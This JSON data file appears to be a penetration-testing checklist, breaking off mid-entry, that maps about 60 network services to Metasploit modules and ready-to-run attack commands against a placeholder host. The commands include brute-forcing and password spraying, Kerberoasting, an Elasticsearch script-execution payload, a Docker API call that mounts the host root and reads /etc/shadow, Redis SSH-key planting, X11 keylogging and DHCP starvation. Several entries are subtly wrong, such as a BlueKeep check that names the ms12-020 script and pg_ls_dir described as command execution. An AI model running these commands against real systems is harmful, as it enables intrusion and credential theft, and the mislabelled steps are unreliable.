[
  {
    "id": "ftp",
    "testing": [
      "msf> auxiliary/scanner/ftp/anonymous - Check for anonymous login: `ftp target.com` (user: anonymous, pass: anonymous)",
      "msf> auxiliary/scanner/ftp/ftp_login - Attempt brute force: `hydra -L users.txt -P pass.txt ftp://target.com`",
      "msf> auxiliary/scanner/portscan/ftpbounce - Check for FTP bounce attack: `nmap -b anonymous:anonymous@target.com otherserver.com`",
      "Look for sensitive data in FTP directories",
      "Test for directory traversal using \"../\" sequences"
    ]
  },
  {
    "id": "ssh",
    "testing": [
      "msf> auxiliary/scanner/ssh/ssh_version - Enumerate version: `nmap -sV -p 22 target.com`",
      "Check for weak ciphers: `nmap --script ssh2-enum-algos target.com`",
      "msf> auxiliary/scanner/ssh/ssh_login - Attempt brute force: `hydra -L users.txt -P pass.txt ssh://target.com`",
      "msf> auxiliary/scanner/ssh/ssh_enumusers - Test for user enumeration: `metasploit auxiliary/scanner/ssh/ssh_enumusers`",
      "Check for authorized_keys file permissions",
      "Look for CVEs for specific SSH versions"
    ]
  },
  {
    "id": "telnet",
    "testing": [
      "Connect manually: `telnet target.com 23`",
      "Sniff credentials: `tcpdump -i eth0 -nn port 23 -w telnet.pcap`",
      "Check for authentication bypass",
      "msf> auxiliary/scanner/telnet/telnet_login - Attempt brute force: `hydra -L users.txt -P pass.txt telnet://target.com`",
      "msf> auxiliary/scanner/telnet/telnet_version - Look for information leakage in banners"
    ]
  },
  {
    "id": "smtp",
    "testing": [
      "msf> auxiliary/scanner/smtp/smtp_relay - Test for open relay: `telnet target.com 25`",
      "msf> auxiliary/scanner/smtp/smtp_enum - User enumeration: `VRFY admin` or `EXPN admin`",
      "Attempt to enumerate users with tools",
      "Check for cleartext auth: `nmap --script smtp-commands target.com`",
      "Test for SMTP command injection"
    ]
  },
  {
    "id": "dns",
    "testing": [
      "msf> auxiliary/gather/enum_dns - Zone transfer attempt: `dig axfr @target.com domain.com`",
      "msf> auxiliary/gather/enum_dns - DNS enumeration: `dnsrecon -d domain.com`",
      "msf> auxiliary/gather/enum_dns - Subdomain discovery: `dnsenum domain.com`",
      "msf> auxiliary/gather/enum_dns - Check for DNSSEC misconfiguration",
      "Test for cache poisoning vulnerabilities"
    ]
  },
  {
    "id": "tftp",
    "testing": [
      "msf> auxiliary/scanner/tftp/tftpbrute - Connect and download files: `tftp target.com`",
      "msf> auxiliary/scanner/tftp/tftpbrute - Try get/put commands on sensitive files",
      "msf> auxiliary/scanner/tftp/tftpbrute - Attempt directory traversal: `get ../../../etc/passwd`",
      "msf> auxiliary/scanner/tftp/tftpbrute - Scan for vulnerable TFTP servers: `nmap -sU -p 69 --script tftp-enum target.com`"
    ]
  },
  {
    "id": "http",
    "testing": [
      "Web application scanning: `nikto -h target.com`",
      "msf> auxiliary/scanner/http/dir_scanner - Directory brute-force: `gobuster dir -u target.com -w wordlist.txt`",
      "msf> auxiliary/scanner/http/ssl - Check for SSL issues: `sslscan target.com`",
      "Test for SQL injection: `sqlmap -u \"https://target.com/page.php?id=1\"`",
      "msf> auxiliary/scanner/http/files_dir - Look for sensitive data in source code",
      "msf> auxiliary/scanner/http/http_login - Check for default credentials",
      "Analyze HTTP headers and cookies"
    ]
  },
  {
    "id": "pop3",
    "testing": [
      "msf> auxiliary/scanner/pop3/pop3_version - Connect manually: `telnet target.com 110`",
      "Check for cleartext auth: `USER username` followed by `PASS password`",
      "msf> auxiliary/scanner/pop3/pop3_login - Attempt brute force: `hydra -l user -P passwords.txt pop3://target.com`",
      "Test SSL/TLS (for POP3S): `openssl s_client -connect target.com:995`"
    ]
  },
  {
    "id": "imap",
    "testing": [
      "msf> auxiliary/scanner/imap/imap_version - Connect manually: `telnet target.com 143`",
      "Login attempt: `a LOGIN username password`",
      "Attempt brute force: `hydra -l user -P passwords.txt imap://target.com`",
      "Check SSL/TLS (for IMAPS): `openssl s_client -connect target.com:993`",
      "msf> auxiliary/scanner/imap/imap_version - List mailboxes: `a LIST \"\" *`"
    ]
  },
  {
    "id": "rpc",
    "testing": [
      "msf> auxiliary/scanner/dcerpc/endpoint_mapper - Enumerate RPC endpoints: `rpcdump.py target.com`",
      "msf> auxiliary/scanner/dcerpc/hidden - Check for null sessions: `rpcclient -U \"\" -N target.com`",
      "msf> auxiliary/scanner/dcerpc/tcp_dcerpc_auditor - Scan for RPC vulnerabilities: `nmap -sV -p 135 --script=msrpc-enum target.com`",
      "Attempt to exploit known RPC CVEs based on version"
    ]
  },
  {
    "id": "netbios",
    "testing": [
      "msf> auxiliary/scanner/netbios/nbname - NetBIOS name scan: `nbtscan target.com/24`",
      "msf> auxiliary/scanner/smb/smb_enumshares - Enumerate shares: `smbclient -L //target.com -N`",
      "msf> auxiliary/scanner/smb/smb_login - Check for null session: `smbclient //target.com/IPC$ -N`",
      "msf> auxiliary/scanner/smb/smb_enumshares - Try to access shares: `smbclient //target.com/C$ -N`"
    ]
  },
  {
    "id": "smb",
    "testing": [
      "msf> auxiliary/scanner/smb/smb_enumshares - Enumerate shares: `smbclient -L //target.com -N`",
      "msf> auxiliary/scanner/smb/smb_version - Check for vulnerable SMB versions: `nmap --script smb-protocols target.com`",
      "msf> auxiliary/scanner/smb/smb_ms17_010 - Scan for MS17-010: `nmap --script smb-vuln-ms17-010 target.com`",
      "msf> auxiliary/scanner/smb/smb_login - Test for null sessions: `smbmap -H target.com`",
      "msf> auxiliary/scanner/smb/smb_enumshares - Try to access shares anonymously: `crackmapexec smb target.com --shares`"
    ]
  },
  {
    "id": "ldap",
    "testing": [
      "msf> auxiliary/gather/ldap_query - Check for anonymous binding: `ldapsearch -x -H ldap://target.com -b \"dc=domain,dc=com\"`",
      "msf> auxiliary/gather/ldap_query - Enumerate users: `ldapsearch -x -H ldap://target.com -b \"dc=domain,dc=com\" \"objectClass=user\"`",
      "msf> auxiliary/gather/ldap_hashdump - Look for sensitive data in LDAP directory",
      "Test for LDAP injection in web applications",
      "Attempt brute force: `nmap --script ldap-brute target.com`"
    ]
  },
  {
    "id": "snmp",
    "testing": [
      "Scan for SNMP: `nmap -sU -p 161 target.com/24`",
      "msf> auxiliary/scanner/snmp/snmp_login - Community string brute force: `onesixtyone -c community.txt target.com`",
      "msf> auxiliary/scanner/snmp/snmp_enum - Walk the MIB tree: `snmpwalk -v2c -c public target.com`",
      "msf> auxiliary/scanner/snmp/snmp_enum - Enumerate users: `snmpwalk -v2c -c public target.com 1.3.6.1.4.1.77.1.2.25`",
      "Check for writeable OIDs: `snmpset`"
    ]
  },
  {
    "id": "rdp",
    "testing": [
      "msf> auxiliary/scanner/rdp/rdp_scanner - Scan for RDP: `nmap -p 3389 --script rdp-ntlm-info target.com`",
      "Check for BlueKeep: `nmap --script rdp-vuln-ms12-020 target.com`",
      "Test for NLA: `ncrack -vv --user administrator -P passwords.txt rdp://target.com`",
      "Attempt brute force: `hydra -l administrator -P passwords.txt rdp://target.com`"
    ]
  },
  {
    "id": "vnc",
    "testing": [
      "msf> auxiliary/scanner/vnc/vnc_none_auth - Scan for VNC: `nmap -p 5900 --script vnc-info target.com`",
      "msf> auxiliary/scanner/vnc/vnc_none_auth - Check for no auth: `vncviewer target.com:5900`",
      "msf> auxiliary/scanner/vnc/vnc_login - Attempt brute force: `hydra -P passwords.txt vnc://target.com`",
      "Look for VNC password files on compromised systems"
    ]
  },
  {
    "id": "redis",
    "testing": [
      "msf> auxiliary/scanner/redis/redis_server - Connect to Redis: `redis-cli -h target.com`",
      "msf> auxiliary/scanner/redis/redis_login - Check authentication: `AUTH password` or try without auth",
      "msf> auxiliary/scanner/redis/redis_server - Enumerate info: `INFO`",
      "msf> auxiliary/scanner/redis/file_upload - Try to modify config: `CONFIG SET dir /var/www/html/`",
      "msf> auxiliary/scanner/redis/file_upload - Attempt to write SSH key: `CONFIG SET dbfilename \"authorized_keys\"`"
    ]
  },
  {
    "id": "nfs",
    "testing": [
      "msf> auxiliary/scanner/nfs/nfsmount - Enumerate NFS shares: `showmount -e target.com`",
      "msf> auxiliary/scanner/nfs/nfsmount - Mount NFS share: `mount -t nfs target.com:/share /mnt/nfs`",
      "Check file permissions on mounted share",
      "msf> auxiliary/scanner/nfs/nfsmount - Look for sensitive files & user data",
      "msf> auxiliary/scanner/nfs/nfsmount - Check no_root_squash misconfiguration"
    ]
  },
  {
    "id": "mysql",
    "testing": [
      "msf> auxiliary/scanner/mysql/mysql_version - Connect to MySQL: `mysql -h target.com -u root -p`",
      "msf> auxiliary/admin/mysql/mysql_enum - Enumerate MySQL users: `SELECT user,host,password FROM mysql.user;`",
      "Check for SQL injection in web apps",
      "msf> auxiliary/scanner/mysql/mysql_login - Attempt brute force: `hydra -l root -P passwords.txt mysql://target.com`",
      "msf> exploit/multi/mysql/mysql_udf_payload - Look for MySQL UDFs for privilege escalation"
    ]
  },
  {
    "id": "postgresql",
    "testing": [
      "msf> auxiliary/scanner/postgres/postgres_version - Connect to PostgreSQL: `psql -h target.com -U postgres`",
      "msf> auxiliary/scanner/postgres/postgres_login - Attempt brute force: `hydra -l postgres -P passwords.txt postgres://target.com`",
      "msf> auxiliary/admin/postgres/postgres_sql - Check for trust authentication in pg_hba.conf",
      "msf> auxiliary/admin/postgres/postgres_readfile - Execute system commands: `SELECT pg_ls_dir('/etc');`",
      "msf> exploit/linux/postgres/postgres_payload - Create malicious functions using `CREATE FUNCTION`"
    ]
  },
  {
    "id": "mongodb",
    "testing": [
      "msf> auxiliary/scanner/mongodb/mongodb_login - Connect to MongoDB: `mongo target.com:27017`",
      "msf> auxiliary/scanner/mongodb/mongodb_login - Check for authentication: try commands without auth",
      "msf> auxiliary/scanner/mongodb/mongodb_login - List databases: `show dbs`",
      "msf> auxiliary/scanner/mongodb/mongodb_login - Enumerate collections: `show collections`",
      "Check for NoSQL injection in web applications",
      "msf> auxiliary/scanner/mongodb/mongodb_login - Extract data: `db.collection.find()`"
    ]
  },
  {
    "id": "mssql",
    "testing": [
      "msf> auxiliary/scanner/mssql/mssql_login - Connect to MSSQL: `sqsh -S target.com -U sa -P password`",
      "msf> auxiliary/scanner/mssql/mssql_login - Attempt brute force: `hydra -l sa -P passwords.txt mssql://target.com`",
      "msf> auxiliary/admin/mssql/mssql_exec - Check for xp_cmdshell: `EXEC master..xp_cmdshell 'whoami'`",
      "msf> auxiliary/admin/mssql/mssql_enum - Enumerate users: `SELECT name FROM master..syslogins`",
      "msf> auxiliary/admin/mssql/mssql_escalate_execute_as - Check for impersonation: `SELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1`"
    ]
  },
  {
    "id": "oracle",
    "testing": [
      "msf> auxiliary/scanner/oracle/oracle_login - Connect to Oracle: `sqlplus username/password@target.com:1521/SID`",
      "msf> auxiliary/scanner/oracle/sid_enum - Enumerate SIDs: `odat sidguesser -s target.com -p 1521`",
      "msf> auxiliary/scanner/oracle/oracle_login - Check default credentials: `hydra -L users.txt -P passwords.txt oracle-listener://target.com`",
      "msf> auxiliary/scanner/oracle/tnspoison_checker - Test for TNS poisoning",
      "msf> auxiliary/admin/oracle/oracle_sql - Try to execute OS commands via DBMS_SCHEDULER or Java stored procedures"
    ]
  },
  {
    "id": "kerberos",
    "testing": [
      "Enumerate users: `kerbrute userenum -d domain.com users.txt`",
      "msf> auxiliary/gather/kerberos_enumusers - Kerberoasting: `GetUserSPNs.py domain.com/user:password -request`",
      "msf> auxiliary/gather/kerberos_enumusers - AS-REP Roasting: `GetNPUsers.py domain.com/ -usersfile users.txt -format hashcat`",
      "Check for overly permissive delegation",
      "msf> auxiliary/scanner/kerberos/kerberos_login - Test for password spraying: `kerbrute passwordspray -d domain.com users.txt password`"
    ]
  },
  {
    "id": "ipsec",
    "testing": [
      "Scan for IKE: `ike-scan target.com`",
      "Test aggressive mode: `ike-scan -M -A target.com`",
      "Attempt to capture handshake: `ike-scan --showbackoff target.com`",
      "Brute force PSK: `psk-crack -b 5 psk.txt handshake.pcap`",
      "Check for vendor implementation weaknesses"
    ]
  },
  {
    "id": "pptp",
    "testing": [
      "Scan for PPTP: `nmap -p 1723 --script pptp-version target.com`",
      "Capture PPTP authentication handshake with Wireshark",
      "Crack MS-CHAPv2 authentication using chapcrack",
      "Test for implementation vulnerabilities",
      "Attempt brute force on VPN credentials"
    ]
  },
  {
    "id": "sip",
    "testing": [
      "msf> auxiliary/scanner/sip/options - Scan for SIP: `nmap -sU -p 5060 --script sip-methods target.com`",
      "msf> auxiliary/scanner/sip/enumerator - Enumerate SIP extensions: `svmap target.com`",
      "Attempt brute force: `svcrack -u100 -d dictionary.txt target.com`",
      "Intercept SIP traffic with Wireshark",
      "Test for unauthorized access to SIP trunks"
    ]
  },
  {
    "id": "irc",
    "testing": [
      "Connect to IRC: `irssi -c target.com`",
      "Enumerate channels: `/list`",
      "Check for bot commands",
      "Look for sensitive information in topic/messages",
      "Test for command injection in IRC bots",
      "Check for outdated IRC server versions with CVEs"
    ]
  },
  {
    "id": "rtsp",
    "testing": [
      "Enumerate RTSP: `nmap -sV -p 554 --script rtsp-methods target.com`",
      "Attempt to connect: `openrtsp rtsp://target.com/stream`",
      "Test for default credentials on cameras",
      "Check for unauthenticated access to streams",
      "Look for information disclosure in RTSP headers",
      "Brute force authentication: `hydra -l admin -P passwords.txt rtsp://target.com`"
    ]
  },
  {
    "id": "rsync",
    "testing": [
      "msf> auxiliary/scanner/rsync/modules_list - List available modules: `rsync rsync://target.com/`",
      "msf> auxiliary/scanner/rsync/modules_list - Check for anonymous access: `rsync rsync://target.com/share/`",
      "msf> auxiliary/scanner/rsync/modules_list - Attempt to access sensitive data: `rsync rsync://target.com/share/etc/`",
      "msf> auxiliary/scanner/rsync/modules_list - Check if shares are writable: `rsync file.txt rsync://target.com/share/`",
      "msf> auxiliary/scanner/rsync/modules_list - Look for configuration errors"
    ]
  },
  {
    "id": "cups",
    "testing": [
      "Access web interface: `http://target.com:631/`",
      "Enumerate printers: `lpstat -h target.com -a`",
      "Check for unauthenticated admin access",
      "Look for printer queue information",
      "msf> auxiliary/scanner/http/http_login - Test for default/weak credentials",
      "Check version for known CVEs"
    ]
  },
  {
    "id": "memcached",
    "testing": [
      "msf> auxiliary/scanner/memcached/memcached_amp - Connect to Memcached: `telnet target.com 11211`",
      "msf> auxiliary/scanner/memcached/memcached_amp - List all keys: `stats items` followed by `stats cachedump [slab_id] 0`",
      "msf> auxiliary/scanner/memcached/memcached_amp - Retrieve values: `get [key]`",
      "msf> auxiliary/scanner/memcached/memcached_amp - Check for DDOS amplification: `stats`",
      "msf> auxiliary/scanner/memcached/memcached_amp - Look for sensitive data in cached keys"
    ]
  },
  {
    "id": "elasticsearch",
    "testing": [
      "msf> auxiliary/scanner/elasticsearch/indices_enum - Check for unauthenticated access: `curl http://target.com:9200/`",
      "msf> auxiliary/scanner/elasticsearch/indices_enum - List all indices: `curl http://target.com:9200/_cat/indices`",
      "msf> auxiliary/scanner/elasticsearch/indices_enum - Query sensitive data: `curl http://target.com:9200/_search?q=password`",
      "Check for RCE via scripts: `curl -X POST \"http://target.com:9200/_search\" -d '{\"script_fields\": {\"exploit\": {\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"id\\\").getText()\"},},},' -H 'Content-Type: application/json'`",
      "msf> auxiliary/scanner/elasticsearch/indices_enum - Look for cluster information: `curl http://target.com:9200/_cluster/health`"
    ]
  },
  {
    "id": "docker",
    "testing": [
      "msf> auxiliary/scanner/http/docker_version - Check for unauthenticated API: `curl http://target.com:2375/version`",
      "List containers: `curl http://target.com:2375/containers/json`",
      "Create privileged container: `curl -X POST -H \"Content-Type: application/json\" http://target.com:2375/containers/create -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"Binds\":[\"/:/host\"], \"Privileged\": true},'`",
      "Execute commands: `curl -X POST http://target.com:2375/containers/[ID]/exec -d '{\"Cmd\":[\"cat\", \"/etc/shadow\"], \"AttachStdout\": true},'`",
      "Look for exposed Docker socket in web apps: `/var/run/docker.sock`"
    ]
  },
  {
    "id": "kubernetes",
    "testing": [
      "Check for unauthenticated API: `curl https://target.com:6443/ -k`",
      "Verify anonymous access: `curl https://target.com:6443/api/v1/namespaces -k`",
      "Look for exposed dashboard: `https://target.com:30000/`",
      "Check for overly permissive RBAC: `kubectl auth can-i --list`",
      "Create privileged pod if authorized: `kubectl apply -f pod.yaml`",
      "Test for pod escape vulnerabilities"
    ]
  },
  {
    "id": "ipmi",
    "testing": [
      "msf> auxiliary/scanner/ipmi/ipmi_version - Scan for IPMI: `nmap -sU -p 623 --script ipmi-version target.com`",
      "msf> auxiliary/scanner/ipmi/ipmi_cipher_zero - Try cipher zero auth: `ipmitool -I lanplus -H target.com -U admin -P admin -C 0 user list`",
      "msf> auxiliary/scanner/ipmi/ipmi_dumphashes - Attempt to dump hashes: `ipmitool -I lanplus -H target.com -U admin -P admin user list`",
      "Check for default credentials",
      "Test for known CVEs based on BMC version"
    ]
  },
  {
    "id": "winrm",
    "testing": [
      "msf> auxiliary/scanner/winrm/winrm_auth_methods - Check if WinRM is running: `nmap -p 5985,5986 target.com`",
      "msf> auxiliary/scanner/winrm/winrm_login - Test credentials: `evil-winrm -i target.com -u administrator -p password`",
      "msf> auxiliary/scanner/winrm/winrm_login - Attempt brute force: `crackmapexec winrm target.com -u users.txt -p passwords.txt`",
      "msf> auxiliary/scanner/winrm/winrm_auth_methods - Check for HTTP/unencrypted WinRM: `-p 5985`",
      "Try known exploits for the identified WinRM version"
    ]
  },
  {
    "id": "x11",
    "testing": [
      "msf> auxiliary/scanner/x11/open_x11 - Check for open X11: `nmap -p 6000-6005 target.com`",
      "msf> auxiliary/scanner/x11/open_x11 - Attempt to connect: `xdpyinfo -display target.com:0`",
      "msf> auxiliary/scanner/x11/open_x11 - Capture screenshots: `xwd -root -screen -silent -display target.com:0 > screenshot.xwd`",
      "msf> auxiliary/scanner/x11/open_x11 - Keylogging: `xinput test $(xinput list --id-only \"keyboard\") -display target.com:0`",
      "msf> auxiliary/scanner/x11/open_x11 - Test for X11 authentication bypass"
    ]
  },
  {
    "id": "xmpp",
    "testing": [
      "Connect to XMPP server: `sendxmpp -v -j target.com -u user -p password`",
      "Enumerate users: `xmpp-user-enum -j target.com -d wordlist.txt`",
      "Check for TLS issues: `openssl s_client -connect target.com:5222 -starttls xmpp`",
      "Test for message interception",
      "Identify XMPP server software and version"
    ]
  },
  {
    "id": "smtp-submission",
    "testing": [
      "msf> auxiliary/scanner/smtp/smtp_version - Connect to SMTP: `telnet target.com 587`",
      "Test for STARTTLS: `STARTTLS`",
      "msf> auxiliary/scanner/smtp/smtp_enum - Check for enumeration: `VRFY admin` or `EXPN admin`",
      "msf> auxiliary/scanner/smtp/smtp_relay - Attempt to relay: Send email from non-local domain",
      "msf> auxiliary/scanner/smtp/smtp_version - Look for version info in banner",
      "Test for authentication bypass"
    ]
  },
  {
    "id": "dhcp",
    "testing": [
      "Identify DHCP server: `nmap --script broadcast-dhcp-discover`",
      "msf> auxiliary/dos/dhcp/dhcp_exhaustion - Test DHCP starvation: `dhcpstarv -i eth0`",
      "msf> auxiliary/server/dhcp - Set up rogue DHCP server to test for controls",
      "Check for DHCP snooping effectiveness",
      "Analyze DHCP options for information disclosure"
    ]
  },
  {
    "id": "radius",
    "testing": [
      "Identify RADIUS server: `nmap -sU -p 1812,1813 target.com`",
      "Test authentication: `radtest username password target.com 0 testing123`",
      "Attempt brute force: `radtest-wrapper.py -u users.txt -p passwords.txt -t target.com`",
      "Check for shared secret issues",
      "Capture and analyze RADIUS traffic with Wireshark"
    ]
  },
  {
    "id": "tacacs",
    "testing": [
      "Identify TACACS+ server: `nmap -p 49 target.com`",
      "Test authentication: `tacacs-client -u username -p password -s shared_secret -r target.com`",
      "Attempt to capture traffic for offline analysis",
      "Check for weak encryption (older versions)",
      "Look for device configurations with TACACS secrets"
    ]
  },
  {
    "id": "cassandra",
    "testing": [
      "Connect to Cassandra: `cqlsh target.com 9042`",
      "Check for default credentials: `cqlsh target.com -u cassandra -p cassandra`",
      "List keyspaces: `SELECT * FROM system.schema_keyspaces;`",
      "Check user roles: `SELECT * FROM system_auth.roles;`",
      "Look for sensitive data in tables",
      "Test for JMX exposure on port 7199"
    ]
  },
  {
    "id": "couchdb",
    "testing": [
      "msf> auxiliary/scanner/couchdb/couchdb_login - Access CouchDB: `curl http://target.com:5984/`",
      "msf> auxiliary/scanner/couchdb/couchdb_enum - List all databases: `curl http://target.com:5984/_all_dbs`",
      "msf> auxiliary/scanner/couchdb/couchdb_login - Check for admin party (no auth): `curl http://target.com:5984/_users`",
      "msf> auxiliary/scanner/couchdb/couchdb_login - Test admin credentials: `curl -u admin:password http://target.com:5984/_config`",
      "msf> auxiliary/scanner/couchdb/couchdb_enum - Look for sensitive information in databases",
      "msf> auxiliary/scanner/couchdb/couchdb_enum - Check for CVEs based on version"
    ]
  },
  {
    "id": "hadoop",
    "testing": [
      "Access HDFS web interface: `http://target.com:50070/`",
      "Check YARN interface: `http://target.com:8088/`",
      "List HDFS directories: `curl http://target.com:50070/webhdfs/v1/?op=LISTSTATUS`",
      "Test for unauthenticated job submission: `curl -X POST http://target.com:8088/ws/v1/cluster/apps/new-application`",
      "Look for sensitive data in HDFS",
      "Check for default configurations"
    ]
  },
  {
    "id": "rabbitmq",
    "testing": [
      "msf> auxiliary/scanner/amqp/amqp_login - Access management interface: `http://target.com:15672/`",
      "msf> auxiliary/scanner/amqp/amqp_login - Test default credentials: `guest:guest`",
      "msf> auxiliary/scanner/amqp/amqp_login - Connect to AMQP: `amqp-client target.com 5672`",
      "msf> auxiliary/scanner/amqp/amqp_login - Check for exposed queues and exchanges",
      "msf> auxiliary/scanner/amqp/amqp_login - Test for weak authorizations on vhosts",
      "msf> auxiliary/scanner/amqp/amqp_login - Attempt to intercept messages"
    ]
  },
  {
    "id": "kafka",
    "testing": [
      "Enumerate topics: `kafkacat -L -b target.com:9092`",
      "Read messages: `kafkacat -C -b target.com:9092 -t sensitive_topic`",
      "Test for unauthenticated producer access: `echo \"test\" | kafkacat -P -b target.com:9092 -t test`",
      "Check for ACL misconfigurations",
      "Attempt to access __consumer_offsets topic",
      "Test SASL authentication if enabled"
    ]
  },
  {
    "id": "zookeeper",
    "testing": [
      "Connect to ZooKeeper: `telnet target.com 2181`",
      "Try four-letter commands: `stat`, `dump`, `conf`, `ruok`, `envi`",
      "List znodes: `ls /`",
      "Get sensitive data: `get /path/to/data`",
      "Check for ACL misconfiguration: `getAcl /path`",
      "Test for administrative access"
    ]
  },
  {
    "id": "jenkins",
    "testing": [
      "msf> auxiliary/scanner/http/jenkins_enum - Access Jenkins: `http://target.com:8080/`",
      "msf> auxiliary/scanner/http/jenkins_command - Check for authentication bypass: `http://target.com:8080/script`",
      "msf> auxiliary/scanner/http/jenkins_login - Test default credentials: `admin:password`",
      "msf> auxiliary/scanner/http/jenkins_enum - Check for outdated plugins",
      "msf> auxiliary/scanner/http/jenkins_command - Attempt to execute Groovy scripts",
      "msf> exploit/multi/http/jenkins_script_console - Look for Jenkins-Cli RCE vulnerabilities"
    ]
  },
  {
    "id": "gitlab",
    "testing": [
      "msf> auxiliary/scanner/http/gitlab_login - Access GitLab: `http://target.com/`",
      "msf> auxiliary/scanner/http/gitlab_version - Check version info: `http://target.com/help`",
      "msf> auxiliary/scanner/http/gitlab_user_enum - Test known CVEs based on version",
      "msf> auxiliary/scanner/http/gitlab_user_enum - Look for sensitive projects with public access",
      "msf> auxiliary/scanner/http/gitlab_user_enum - Check for SSRF vulnerabilities",
      "msf> auxiliary/scanner/http/gitlab_login - Test for authentication bypass"
    ]
  },
  {
    "id": "jira",
    "testing": [
      "Access Jira: `http://target.com:8080/`",
      "Check version info: `http://target.com:8080/secure/Dashboard.jspa` (footer)",
      "msf> auxiliary/scanner/http/jira_user_enum - Test for user enumeration: `http://target.com:8080/secure/ViewUserHover.jspa?username=admin`",
      "Check for publicly accessible projects",
      "Test known CVEs based on version",
      "Look for sensitive data in issues"
    ]
  },
  {
    "id": "splunk",
    "testing": [
      "msf> auxiliary/scanner/http/splunk_web_login - Access web interface: `http://target.com:8000/`",
      "msf> auxiliary/scanner/http/splunk_web_login - Test REST API: `curl -k https://target.com:8089/services/server/info`",
      "msf> auxiliary/scanner/http/splunk_web_login - Check for default credentials: `admin:changeme`",
      "msf> auxiliary/scanner/http/splunk_web_login - Test for RCE through custom apps",
      "msf> auxiliary/scanner/http/splunk_web_login - Look for sensitive data in indexes",
      "msf> auxiliary/scanner/http/splunk_web_login - Check for vulnerable add-ons"
    ]
  },
  {
    "id": "tomcat",
    "testing": [
      "msf> auxiliary/scanner/http/tomcat_mgr_login - Access Tomcat: `http://target.com:8080/`",
      "msf> auxiliary/scanner/http/tomcat_mgr_login - Check manager: `http://target.com:8080/manager/html`",
      "msf> auxiliary/scanner/http/tomcat_mgr_login - Test default credentials: `tomcat:tomcat`, `admin:admin`",
      "msf> exploit/multi/http/tomcat_mgr_deploy - Attempt to deploy WAR file if access is gained",
      "msf> auxiliary/scanner/http/tomcat_enum - Check for sensitive information in error pages",
      "msf> auxiliary/scanner/http/tomcat_enum - Look for version info in HTTP headers"
    ]
  },
  {
    "id": "jboss",
    "testing": [
      "msf> auxiliary/scanner/http/jboss_vulnscan - Access JBoss: `http://target.com:8080/`",
      "msf> auxiliary/scanner/http/jboss_vulnscan - Check admin console: `http://target.com:9990/console`",
      "msf> auxiliary/scanner/http/jboss_vulnscan - Test JMX Console: `http://target.com:8080/jmx-console/`",
      "msf> auxiliary/scanner/http/jboss_vulnscan - Look for JMXInvokerServlet: `http://target.com:8080/invoker/JMXInvokerServlet`",
      "msf> exploit/multi/http/jboss_maindeployer - Test known deserialization exploits",
      "msf> auxiliary/scanner/http/jboss_vulnscan - Check for default credentials: `admin:admin`"
    ]
  },
  {
    "id": "weblogic",
    "testing": [
      "Access WebLogic: `http://target.com:7001/console`",
      "Test for T3 protocol: `nmap --script weblogic-t3-info -p 7001 target.com`",
      "Check for known deserialization CVEs",
      "Test default credentials: `weblogic:weblogic`",
      "Look for WSAT component vulnerabilities",
      "Test for path traversal in web apps"
    ]
  },
  {
    "id": "websphere",
    "testing": [
      "Access admin console: `https://target.com:9043/ibm/console/`",
      "Check for snoop servlet: `http://target.com:9080/snoop`",
      "Test default credentials: `admin:admin`",
      "Check for SOAP deserialization vulnerabilities",
      "Look for sensitive information in error messages",
      "Test for known CVEs based on version"
    ]
  },
  {
    "id": "sap",
    "testing": [
      "msf> auxiliary/scanner/sap/sap_service_discovery - Access web interface: `http://target.com:8000/`",
      "msf> auxiliary/scanner/sap/sap_service_discovery - Check for SMDAgents: `http://target.com:8000/sap/monitoring/`",
      "Test default accounts: `SAP*`, `DDIC`, etc.",
      "msf> auxiliary/scanner/sap/sap_icm_urlscan - Scan for ICM vulnerabilities",
      "msf> auxiliary/scanner/sap/sap_rfc_client_enumerate - Look for exposed RFC interfaces",
      "msf> auxiliary/scanner/sap/sap_router_portscanner - Check for gateway security issues"
    ]
  },
{
    "id": "msmq",
    "testing": [
      "Check for MSMQ service: `nmap -p 1801 target.com`",
      "Connect to MSMQ: `net use \\\\target.com\\private$\\queue`",
      "Enumerate queues: `msmqutil `",
      "Check message contents",
      "Test for remote queue creation",
      "Look for excessive permissions"
    ]
  },
  {
    "id": "bgp",
    "testing": [
      "Scan for BGP: `nmap -p 179 target.com`",
      "Check for bogus routes acceptance",
      "Test for peer authentication",
      "Look for route filtering issues",
      "Attempt valid BGP announcements",
      "Test for maximum prefix limits"
    ]
  },
  {
    "id": "dlap",
    "testing": [
      "msf> auxiliary/scanner/http/http_login - Connect to OMSA: `https://target.com:1311/`",
      "msf> auxiliary/scanner/http/http_login - Check for default credentials: `username: root, password: calvin`",
      "msf> auxiliary/scanner/http/http_version - Look for sensitive information in web interface",
      "Test for command execution in diagnostic features",
      "Check for authentication bypass vulnerabilities",
      "Scan for known CVEs in reported version"
    ]
  },
  {
    "id": "esxi",
    "testing": [
      "msf> auxiliary/scanner/vmware/esx_fingerprint - Access ESXi web interface: `https://target.com/`",
      "msf> auxiliary/scanner/vmware/vmware_http_login - Test default credentials: `root:vmware`",
      "msf> auxiliary/scanner/vmware/esx_fingerprint - Check for ESXi version and patch level",
      "Look for known CVEs based on version",
      "Test for authentication bypass vulnerabilities",
      "msf> auxiliary/scanner/vmware/vmware_http_login - Attempt VM console access"
    ]
  },
  {
    "id": "vcenter",
    "testing": [
      "msf> auxiliary/scanner/vmware/vmware_http_login - Access vCenter: `https://target.com/`",
      "msf> auxiliary/scanner/vmware/vmware_http_login - Test default credentials: `administrator@vsphere.local:vmware`",
      "msf> auxiliary/scanner/vmware/vmware_http_login - Check for vCenter version and patch level",
      "Look for known CVEs based on version",
      "Test for authentication bypass vulnerabilities",
      "Attempt SSRF through vCenter interfaces"
    ]
  },
  {
    "id": "activedirectory",
    "testing": [
      "msf> auxiliary/gather/ldap_query - Enumerate users: `ldapsearch -x -h target.com -b \"dc=domain,dc=com\" \"objectClass=user\"`",
      "msf> auxiliary/scanner/smb/smb_login - Password spraying: `crackmapexec smb target.com -u users.txt -p Winter2020`",
      "msf> auxiliary/gather/kerberos_enumusers - Kerberoasting: `GetUserSPNs.py domain.com/user:password -request`",
      "msf> auxiliary/gather/kerberos_enumusers - AS-REP Roasting: `GetNPUsers.py domain.com/ -usersfile users.txt -format hashcat`",
      "msf> auxiliary/gather/ldap_query - Check for LDAP signing and channel binding",
      "Test for DCSync permissions"
    ]
  },
  {
    "id": "nosql",
    "testing": [
      "Test for NoSQL injection in web apps",
      "msf> auxiliary/scanner/mongodb/mongodb_login - Check for exposed database interfaces",
